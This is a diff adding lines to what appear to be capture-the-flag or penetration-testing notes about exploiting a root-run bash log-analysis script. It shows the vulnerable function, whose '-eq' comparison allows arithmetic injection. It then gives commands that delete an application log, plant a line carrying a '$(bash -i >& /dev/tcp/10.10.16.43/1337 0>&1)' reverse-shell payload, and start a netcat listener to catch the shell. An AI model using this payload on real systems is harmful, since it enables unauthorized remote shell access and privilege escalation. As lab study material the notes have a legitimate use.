@@ -213,3 +213,30 @@ Running pspy tool tool to monitor running processes without the need for root pr
 
 
 
+```
+analyze_http_statuses() {
+    # Process HTTP status codes
+    while IFS= read -r line; do
+        code=$(echo "$line" | grep -oP 'Status: \K.*')
+        found=0
+        # Check if code exists in STATUS_CODES array
+        for i in "${!STATUS_CODES[@]}"; do
+            existing_entry="${STATUS_CODES[$i]}"
+            existing_code=$(echo "$existing_entry" | cut -d':' -f1)
+            existing_count=$(echo "$existing_entry" | cut -d':' -f2)
+            if [[ "$existing_code" -eq "$code" ]]; then
+                new_count=$((existing_count + 1))
+                STATUS_CODES[$i]="${existing_code}:${new_count}"
+                break
+            fi
+        done
+    done < <(grep "HTTP.*Status: " "$LOG_FILE")
+}
+```
+
+
+rm -f /var/www/web/user-management-service/log/application.log
+echo 'HTTP Status: x a[$(bash -i >& /dev/tcp/10.10.16.43/1337 0>&1)]' > /var/www/web/user-management-service/log/application.log
+
+
+nc -l 1337
